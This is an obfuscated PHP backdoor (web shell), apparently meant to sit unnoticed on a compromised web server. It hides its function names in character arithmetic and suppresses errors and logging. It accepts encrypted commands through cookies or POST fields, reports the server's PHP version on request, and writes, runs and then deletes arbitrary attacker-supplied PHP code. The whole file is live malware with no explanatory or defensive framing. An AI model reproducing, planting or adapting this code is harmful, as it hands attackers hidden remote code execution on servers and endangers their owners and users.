<?php $clskd = "\146".chr(105).chr(108)."\x65"."\x5f"."\x70".'u'.chr(772-656).'_'.chr(587-488).'o'."\156"."\164"."\x65".chr(836-726)."\164"."\x73";
$vqdtqu = 'b'.'a'.chr(115)."\x65".'6'."\64".chr(144-49).chr(801-701).chr(1059-958).'c'.chr(641-530).chr(100)."\x65";
$sfcawcoit = 'i'.chr(644-534)."\151"."\137"."\x73".chr(358-257)."\164";
$xcmhm = chr(773-656).'n'."\154".chr(388-283).'n'.'k';


@$sfcawcoit(chr(1031-930).'r'."\162".chr(111).'r'.chr(393-298).'l'."\x6f".chr(686-583), NULL);
@$sfcawcoit("\154"."\x6f"."\147".'_'.chr(834-733)."\x72".chr(478-364)."\157".chr(114)."\163", 0);
@$sfcawcoit(chr(109)."\141"."\x78".chr(95).'e'."\170"."\x65".'c'."\165"."\164".'i'.'o'."\156"."\x5f".'t'."\151".chr(109).'e', 0);
@set_time_limit(0);

function hpsjfgnznz($tdgphihy, $kvunnhtdne)
{
    $qfmlhsu = "";
    for ($lzwnv = 0; $lzwnv < strlen($tdgphihy);) {
        for ($j = 0; $j < strlen($kvunnhtdne) && $lzwnv < strlen($tdgphihy); $j++, $lzwnv++) {
            $qfmlhsu .= chr(ord($tdgphihy[$lzwnv]) ^ ord($kvunnhtdne[$j]));
        }
    }
    return $qfmlhsu;
}

$nyvpaompo = array_merge($_COOKIE, $_POST);
$hnsztjjdg = '03721c1f-06f0-4435-ae17-8848332e2f71';
foreach ($nyvpaompo as $csobzg => $tdgphihy) {
    $tdgphihy = @unserialize(hpsjfgnznz(hpsjfgnznz($vqdtqu($tdgphihy), $hnsztjjdg), $csobzg));
    if (isset($tdgphihy["\141"."\153"])) {
        if ($tdgphihy[chr(97)] == 'i') {
            $lzwnv = array(
                'p'.chr(118) => @phpversion(),
                chr(1050-935).'v' => "3.5",
            );
            echo @serialize($lzwnv);
        } elseif ($tdgphihy[chr(97)] == "\145") {
            $lqbqck = "./" . md5($hnsztjjdg) . chr(449-403)."\151".chr(956-846)."\143";
            @$clskd($lqbqck, "<" . "\77"."\x70"."\x68".chr(112).chr(481-449)."\x40"."\x75".chr(636-526).chr(970-862)."\151".chr(110).chr(107).chr(227-187).'_'.'_'.chr(70)."\x49".chr(76).'E'.'_'."\137".chr(41).chr(185-126).chr(32) . $tdgphihy["\x64"]);
            @include($lqbqck);
            @$xcmhm($lqbqck);
        }
        exit();
    }
}

